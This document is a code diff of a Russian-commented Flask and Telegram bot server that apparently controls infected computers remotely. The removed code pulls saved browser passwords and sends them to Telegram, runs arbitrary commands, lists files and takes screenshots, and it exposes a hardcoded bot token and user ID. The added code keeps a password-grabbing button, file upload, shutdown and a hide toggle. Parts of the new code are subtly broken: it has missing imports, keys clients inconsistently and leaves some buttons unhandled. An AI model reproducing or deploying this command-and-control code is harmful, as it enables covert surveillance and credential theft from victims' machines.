@@ -1,394 +1,261 @@
 import os
-import logging
-import requests
-import threading
-import time
-import asyncio
 import json
+import uuid
+from datetime import datetime, timedelta
 from flask import Flask, request, jsonify
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    CallbackQueryHandler,
-    ContextTypes,
-    MessageHandler,
-    filters
-)
+from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
 
 app = Flask(__name__)
 
 # ===== КОНФИГУРАЦИЯ =====
-BOT_TOKEN = "8004274832:AAGbnNEvxH09Ja9OdH9KoEOFZfCl98LsqDU"
-AUTHORIZED_USERS = [6330090175]
-SERVER_URL = "https://mypc-wk16.onrender.com"
-PORT = 10000
+TOKEN = "YOUR_BOT_TOKEN"  # Токен от @BotFather
+SECRET_KEY = "YOUR_SECRET_KEY"  # Должен совпадать с ключом на клиенте
+PORT = int(os.environ.get('PORT', 5000))
 # ========================
 
-CLIENTS = {}
-BROWSER_DATA_CACHE = {}
-SYSTEM_INFO_CACHE = {}
+bot = Bot(token=TOKEN)
+clients = {}  # Словарь для хранения состояния клиентов
+pending_commands = {}  # Очередь команд
 
-# Настройка логгирования
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+# Меню управления
+KEYBOARD_LAYOUT = [
+    [InlineKeyboardButton("🖥 IP адрес", callback_data='ip'),
+     InlineKeyboardButton("📸 Скриншот", callback_data='screenshot')],
+    [InlineKeyboardButton("🎥 Видео на экран", callback_data='play_video'),
+     InlineKeyboardButton("🖼 Фото на экран", callback_data='play_photo')],
+    [InlineKeyboardButton("❌ Alt+F4", callback_data='altf4'),
+     InlineKeyboardButton("🔒 Получить пароли", callback_data='passwords')],
+    [InlineKeyboardButton("🔄 Перезагрузить", callback_data='reboot'),
+     InlineKeyboardButton("⏹ Выключить", callback_data='shutdown')],
+    [InlineKeyboardButton("👻 Скрыть/Показать", callback_data='toggle_visibility')]
+]
 
-# Инициализация приложения бота
-bot_app = Application.builder().token(BOT_TOKEN).build()
-
-# Очистка неактивных клиентов
-def cleanup_clients():
-    while True:
-        time.sleep(300)
-        now = time.time()
-        inactive = [cid for cid, cdata in CLIENTS.items() if now - cdata['last_seen'] > 1800]
-        
-        for client_id in inactive:
-            del CLIENTS[client_id]
-            logger.info(f"Removed inactive client: {client_id}")
-
-# Регистрация клиента
-@app.route('/register', methods=['POST'])
-def register_client():
+@app.route('/heartbeat', methods=['POST'])
+def heartbeat():
+    """Обработка проверки состояния от клиента"""
     data = request.json
-    client_id = data['client_id']
+    if data.get('key') != SECRET_KEY:
+        return jsonify({'status': 'unauthorized'}), 401
     
-    CLIENTS[client_id] = {
-        'ip': data.get('ip', request.remote_addr),
-        'port': data['port'],
-        'url': f"http://{data['ip']}:{data['port']}",
-        'last_seen': time.time(),
-        'name': data.get('name', client_id),
-        'user': data.get('user', 'Unknown')
+    client_id = data.get('ip', 'unknown')
+    clients[client_id] = {
+        'last_seen': datetime.now(),
+        'ip': data.get('ip', ''),
+        'status': 'online'
     }
-    
-    # Отправляем уведомление в Telegram
-    message = (
-        f"🔔 *Новое устройство онлайн!*\n\n"
-        f"💻 Имя: `{CLIENTS[client_id]['name']}`\n"
-        f"👤 Пользователь: `{CLIENTS[client_id]['user']}`\n"
-        f"🌐 IP: `{data['ip']}`\n"
-        f"🆔 ID: `{client_id}`"
-    )
-    
-    for user_id in AUTHORIZED_USERS:
-        try:
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    "chat_id": user_id,
-                    "text": message,
-                    "parse_mode": "Markdown"
-                }
-            )
-        except Exception as e:
-            logger.error(f"Notification error: {e}")
-    
-    return jsonify({"status": "success"})
+    return jsonify({'status': 'ok'})
 
-# Проксирование команд клиенту
-@app.route('/client/<client_id>/<command>', methods=['GET', 'POST'])
-def client_command(client_id, command):
-    if client_id not in CLIENTS:
-        return jsonify({"error": "Client not found"}), 404
+@app.route('/commands', methods=['GET'])
+def get_commands():
+    """Получение команд для клиента"""
+    client_key = request.args.get('key')
+    if client_key != SECRET_KEY:
+        return jsonify([])
     
-    client = CLIENTS[client_id]
-    url = f"{client['url']}/{command}"
-    
-    try:
-        if request.method == 'POST':
-            response = requests.post(url, json=request.json, timeout=60)
-        else:
-            response = requests.get(url, timeout=60)
-        
-        # Кэшируем данные
-        if command == "browser_data":
-            BROWSER_DATA_CACHE[client_id] = response.json()
-        elif command == "system_info":
-            SYSTEM_INFO_CACHE[client_id] = response.json()
-        
-        return response.content, response.status_code, response.headers.items()
-    except Exception as e:
-        logger.error(f"Forward error: {e}")
-        return jsonify({"error": str(e)}), 500
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+    commands = pending_commands.get(client_ip, [])
+    return jsonify(commands)
 
-# Telegram Bot Handlers
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in AUTHORIZED_USERS:
-        await update.message.reply_text("⛔ Доступ запрещен!")
-        return
+@app.route('/complete', methods=['POST'])
+def complete_command():
+    """Подтверждение выполнения команды"""
+    data = request.json
+    if data.get('key') != SECRET_KEY:
+        return jsonify({'status': 'unauthorized'}), 401
     
-    if not CLIENTS:
-        await update.message.reply_text("🔎 Нет активных устройств")
-        return
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+    command_id = data.get('command_id')
     
-    keyboard = []
-    for client_id, client_data in CLIENTS.items():
-        btn_text = f"💻 {client_data['name']} ({client_data['user']})"
-        keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"select_{client_id}")])
-    
-    keyboard.append([InlineKeyboardButton("🔄 Обновить список", callback_data="refresh")])
-    
-    await update.message.reply_text(
-        "🔒 Выберите устройство:",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
-
-async def handle_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if query.data == "refresh":
-        await start(update, context)
-        return
-        
-    if query.data.startswith("select_"):
-        client_id = query.data.split("_")[1]
-        context.user_data['selected_client'] = client_id
-        client_data = CLIENTS[client_id]
-        
-        keyboard = [
-            [InlineKeyboardButton("🖥 Скриншот", callback_data="screenshot"),
-             InlineKeyboardButton("🔍 Системная информация", callback_data="system_info")],
-            [InlineKeyboardButton("🔑 Данные браузеров", callback_data="browser_data"),
-             InlineKeyboardButton("📂 Список файлов", callback_data="list_files")],
-            [InlineKeyboardButton("🔒 Блокировка", callback_data="lock"),
-             InlineKeyboardButton("🔁 Перезагрузка", callback_data="reboot")],
-            [InlineKeyboardButton("⭕ Выключить", callback_data="shutdown"),
-             InlineKeyboardButton("⌨️ Выполнить команду", callback_data="run_command")],
-            [InlineKeyboardButton("💬 Отправить сообщение", callback_data="message_box"),
-             InlineKeyboardButton("🔙 Назад", callback_data="back")]
+    if client_ip in pending_commands:
+        pending_commands[client_ip] = [
+            cmd for cmd in pending_commands[client_ip] 
+            if cmd.get('id') != command_id
         ]
-        
-        await query.edit_message_text(
-            f"🔧 Управление устройством:\n"
-            f"💻 *{client_data['name']}* ({client_data['user']})\n"
-            f"🌐 IP: `{client_data['ip']}`\n"
-            f"⏱ Последняя активность: {time.ctime(client_data['last_seen'])}",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(keyboard)
-        )
+    
+    return jsonify({'status': 'ok'})
 
-async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    """Загрузка файлов от клиента"""
+    if request.form.get('key') != SECRET_KEY:
+        return jsonify({'status': 'unauthorized'}), 401
+    
+    file = request.files.get('file')
+    file_type = request.form.get('type', 'file')
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+    
+    if file:
+        # Для демонстрации просто сохраняем файл
+        filename = f"{file_type}_{client_ip}_{int(datetime.now().timestamp())}"
+        file.save(os.path.join('uploads', filename))
+        
+        return jsonify({'status': 'success'})
+    
+    return jsonify({'status': 'no_file'}), 400
+
+def send_menu(chat_id):
+    """Отправка меню с кнопками"""
+    bot.send_message(
+        chat_id=chat_id,
+        text="🔒 <b>Управление ноутбуком</b> 🔒\nВыберите действие:",
+        reply_markup=InlineKeyboardMarkup(KEYBOARD_LAYOUT),
+        parse_mode='HTML'
+    )
+
+def button_handler(update: Update, context):
+    """Обработчик нажатий кнопок"""
     query = update.callback_query
-    await query.answer()
-    
-    if query.data == "back":
-        await start(update, context)
-        return
-    
-    if 'selected_client' not in context.user_data:
-        await query.edit_message_text("❌ Устройство не выбрано!")
-        return
-    
-    client_id = context.user_data['selected_client']
-    command = query.data
-    
-    if command in ["run_command", "message_box", "list_files"]:
-        context.user_data['last_command'] = command
-        prompt = {
-            "run_command": "⌨️ Введите команду для выполнения:",
-            "message_box": "✉️ Введите сообщение для отображения:",
-            "list_files": "📂 Введите путь к папке (например, C:\\):"
-        }
-        await query.edit_message_text(prompt[command])
-        return
+    user_id = query.from_user.id
+    data = query.data
+    chat_id = query.message.chat_id
     
     try:
-        response = requests.get(
-            f"{SERVER_URL}/client/{client_id}/{command}",
-            timeout=30
-        )
+        # Получаем первый доступный клиент
+        client_id = next(iter(clients.keys()), None)
         
-        if response.status_code == 200:
-            if command == "screenshot":
-                await context.bot.send_photo(
-                    chat_id=query.message.chat_id,
-                    photo=response.content,
-                    caption=f"🖥 Скриншот с {CLIENTS[client_id]['name']}"
-                )
-            elif command == "browser_data":
-                data = response.json()
-                # Формируем краткий отчет
-                report = "🔑 *Данные браузеров:*\n"
-                for browser, browser_data in data.items():
-                    if "passwords" in browser_data:
-                        report += f"\n*{browser}*: {len(browser_data['passwords'])} паролей"
-                
-                # Отправляем полные данные файлом
-                filename = f"browser_data_{client_id}.json"
-                with open(filename, "w", encoding="utf-8") as f:
-                    json.dump(data, f)
-                
-                await query.edit_message_text(report, parse_mode="Markdown")
-                await context.bot.send_document(
-                    chat_id=query.message.chat_id,
-                    document=open(filename, "rb"),
-                    filename=filename
-                )
-                os.remove(filename)
-            elif command == "system_info":
-                data = response.json()
-                # Формируем краткий отчет
-                report = (
-                    f"💻 *Системная информация:*\n\n"
-                    f"ОС: {data.get('system', '')} {data.get('release', '')}\n"
-                    f"Процессор: {data.get('processor', '')}\n"
-                    f"Память: {data.get('memory', {}).get('total', 0) // (1024**3)} GB\n"
-                    f"Пользователи: {', '.join(data.get('users', []))}"
-                )
-                
-                # Отправляем полные данные файлом
-                filename = f"system_info_{client_id}.json"
-                with open(filename, "w", encoding="utf-8") as f:
-                    json.dump(data, f)
-                
-                await query.edit_message_text(report, parse_mode="Markdown")
-                await context.bot.send_document(
-                    chat_id=query.message.chat_id,
-                    document=open(filename, "rb"),
-                    filename=filename
-                )
-                os.remove(filename)
-            else:
-                await query.edit_message_text(f"✅ Команда выполнена на {CLIENTS[client_id]['name']}")
-        else:
-            await query.edit_message_text(f"❌ Ошибка выполнения команды")
+        if not client_id:
+            bot.send_message(chat_id, "⚠️ Нет подключенных устройств")
+            return
+        
+        if data == 'ip':
+            bot.send_message(chat_id, f"📡 IP адрес устройства: {clients[client_id]['ip']}")
+        
+        elif data == 'screenshot':
+            command = {
+                'id': str(uuid.uuid4()),
+                'type': 'screenshot',
+                'timestamp': datetime.now().isoformat()
+            }
+            pending_commands.setdefault(client_id, []).append(command)
+            bot.send_message(chat_id, "📸 Запрошен скриншот...")
+        
+        elif data == 'play_video':
+            bot.send_message(chat_id, "📹 Отправьте видео файл...")
+            context.user_data['awaiting_media'] = {'type': 'video', 'client': client_id}
+        
+        elif data == 'play_photo':
+            bot.send_message(chat_id, "🖼 Отправьте фото...")
+            context.user_data['awaiting_media'] = {'type': 'image', 'client': client_id}
+        
+        elif data == 'altf4':
+            command = {
+                'id': str(uuid.uuid4()),
+                'type': 'altf4',
+                'timestamp': datetime.now().isoformat()
+            }
+            pending_commands.setdefault(client_id, []).append(command)
+            bot.send_message(chat_id, "✅ Команда Alt+F4 отправлена")
+        
+        elif data == 'reboot':
+            command = {
+                'id': str(uuid.uuid4()),
+                'type': 'reboot',
+                'timestamp': datetime.now().isoformat()
+            }
+            pending_commands.setdefault(client_id, []).append(command)
+            bot.send_message(chat_id, "🔄 Команда перезагрузки отправлена")
+        
+        elif data == 'shutdown':
+            command = {
+                'id': str(uuid.uuid4()),
+                'type': 'shutdown',
+                'timestamp': datetime.now().isoformat()
+            }
+            pending_commands.setdefault(client_id, []).append(command)
+            bot.send_message(chat_id, "⏹ Команда выключения отправлена")
+        
+        # Обновляем меню
+        send_menu(chat_id)
+        bot.answer_callback_query(query.id)
+    
     except Exception as e:
-        logger.error(f"Command error: {e}")
-        await query.edit_message_text("🔥 Ошибка соединения с устройством")
+        bot.send_message(chat_id, f"⚠️ Ошибка: {str(e)}")
 
-async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in AUTHORIZED_USERS:
+def media_handler(update: Update, context):
+    """Обработчик медиафайлов"""
+    media_info = context.user_data.get('awaiting_media')
+    if not media_info:
         return
     
-    if 'last_command' not in context.user_data or 'selected_client' not in context.user_data:
-        return
-    
-    text = update.message.text
-    command = context.user_data['last_command']
-    client_id = context.user_data['selected_client']
+    chat_id = update.message.chat_id
+    client_id = media_info.get('client')
+    media_type = media_info.get('type')
     
     try:
-        if command == "run_command":
-            response = requests.post(
-                f"{SERVER_URL}/client/{client_id}/cmd",
-                json={"command": text},
-                timeout=30
-            )
-            if response.ok:
-                result = response.json()
-                output = result.get('output', '')[:4000]
-                await update.message.reply_text(f"✅ Результат:\n```\n{output}\n```", parse_mode="Markdown")
-            else:
-                await update.message.reply_text("❌ Ошибка выполнения команды")
-        
-        elif command == "message_box":
-            response = requests.post(
-                f"{SERVER_URL}/client/{client_id}/message_box",
-                json={"message": text},
-                timeout=10
-            )
-            await update.message.reply_text("✅ Сообщение отправлено" if response.ok else "❌ Ошибка")
-        
-        elif command == "list_files":
-            response = requests.post(
-                f"{SERVER_URL}/client/{client_id}/list_files",
-                json={"path": text},
-                timeout=30
-            )
-            if response.ok:
-                data = response.json()
-                file_list = "\n".join([f"📁 {f['name']}" if f['type'] == 'directory' else f"📄 {f['name']}" 
-                                      for f in data[:50]])
-                await update.message.reply_text(f"📂 Содержимое {text}:\n{file_list}")
-            else:
-                await update.message.reply_text("❌ Ошибка получения списка файлов")
-    
-    except Exception as e:
-        logger.error(f"Text command error: {e}")
-        await update.message.reply_text("🔥 Ошибка соединения с устройством")
-    
-    # Сбрасываем состояние
-    context.user_data.pop('last_command', None)
-
-# Регистрация обработчиков
-def register_handlers():
-    bot_app.add_handler(CommandHandler("start", start))
-    bot_app.add_handler(CallbackQueryHandler(handle_selection))
-    bot_app.add_handler(CallbackQueryHandler(handle_command))
-    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-
-# Веб-хук обработчик (исправленная версия)
-@app.post(f'/{BOT_TOKEN}')
-def webhook():
-    json_data = request.get_json()
-    update = Update.de_json(json_data, bot_app.bot)
-    logger.info(f"Received update: {update.update_id}")
-    
-    # Используем потокобезопасный метод для добавления обновления
-    try:
-        bot_app.update_queue.put_nowait(update)
-    except Exception as e:
-        logger.error(f"Error putting update in queue: {e}")
-    
-    return '', 200
-
-# Установка веб-хука при запуске
-async def set_webhook():
-    webhook_url = f"{SERVER_URL}/{BOT_TOKEN}"
-    try:
-        result = await bot_app.bot.set_webhook(webhook_url)
-        logger.info(f"Webhook установлен: {webhook_url} - {result}")
-    except Exception as e:
-        logger.error(f"Ошибка установки webhook: {e}")
-
-def run_bot():
-    register_handlers()
-    
-    # Запуск бота в фоновом потоке с обработкой обновлений
-    def start_bot():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
-        try:
-            # Инициализация бота
-            loop.run_until_complete(bot_app.initialize())
+        if media_type == 'image' and update.message.photo:
+            photo = update.message.photo[-1]
+            file = bot.get_file(photo.file_id)
+            file_url = file.file_path
             
-            # Установка вебхука
-            loop.run_until_complete(set_webhook())
+            command = {
+                'id': str(uuid.uuid4()),
+                'type': 'media',
+                'media_type': 'image',
+                'url': file_url,
+                'timestamp': datetime.now().isoformat()
+            }
+            pending_commands.setdefault(client_id, []).append(command)
+            bot.send_message(chat_id, "✅ Фото отправлено на устройство")
+        
+        elif media_type == 'video' and update.message.video:
+            video = update.message.video
+            file = bot.get_file(video.file_id)
+            file_url = file.file_path
             
-            # Запуск обработки обновлений
-            logger.info("Бот запущен и готов к обработке обновлений")
-            loop.run_until_complete(bot_app.start())
-            loop.run_forever()
-        except Exception as e:
-            logger.exception(f"Fatal error in bot thread: {e}")
-        finally:
-            loop.run_until_complete(bot_app.stop())
-            loop.close()
+            command = {
+                'id': str(uuid.uuid4()),
+                'type': 'media',
+                'media_type': 'video',
+                'url': file_url,
+                'timestamp': datetime.now().isoformat()
+            }
+            pending_commands.setdefault(client_id, []).append(command)
+            bot.send_message(chat_id, "✅ Видео отправлено на устройство")
+        
+        # Очищаем состояние ожидания
+        del context.user_data['awaiting_media']
+        send_menu(chat_id)
     
-    bot_thread = threading.Thread(target=start_bot, daemon=True)
-    bot_thread.start()
-    logger.info("Поток обработки бота запущен")
+    except Exception as e:
+        bot.send_message(chat_id, f"⚠️ Ошибка обработки медиа: {str(e)}")
 
-@app.route('/')
-def index():
-    return "Сервер запущен. Ожидание команд."
-
-if __name__ == "__main__":
-    logger.info("Сервер запускается...")
+def start_bot():
+    """Запуск Telegram бота"""
+    updater = Updater(token=TOKEN, use_context=True)
+    dp = updater.dispatcher
     
-    # Запуск очистки неактивных клиентов
-    threading.Thread(target=cleanup_clients, daemon=True).start()
+    # Обработчики
+    dp.add_handler(CommandHandler('start', lambda u,c: send_menu(u.message.chat_id)))
+    dp.add_handler(CallbackQueryHandler(button_handler))
+    dp.add_handler(MessageHandler(Filters.photo | Filters.video, media_handler))
     
     # Запуск бота
-    run_bot()
+    updater.start_polling()
+    updater.idle()
+
+@app.route('/')
+def home():
+    return "PC Control Bot is running!"
+
+def cleanup_clients():
+    """Очистка неактивных клиентов"""
+    while True:
+        now = datetime.now()
+        for client_id, client_data in list(clients.items()):
+            if now - client_data['last_seen'] > timedelta(minutes=5):
+                del clients[client_id]
+        time.sleep(300)
+
+if __name__ == '__main__':
+    # Создаем папку для загрузок
+    os.makedirs('uploads', exist_ok=True)
     
-    # Запуск Flask сервера
-    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
+    # Запускаем очистку клиентов в фоне
+    threading.Thread(target=cleanup_clients, daemon=True).start()
+    
+    # Запускаем бота в отдельном потоке
+    threading.Thread(target=start_bot, daemon=True).start()
+    
+    # Запускаем Flask сервер
+    app.run(host='0.0.0.0', port=PORT)
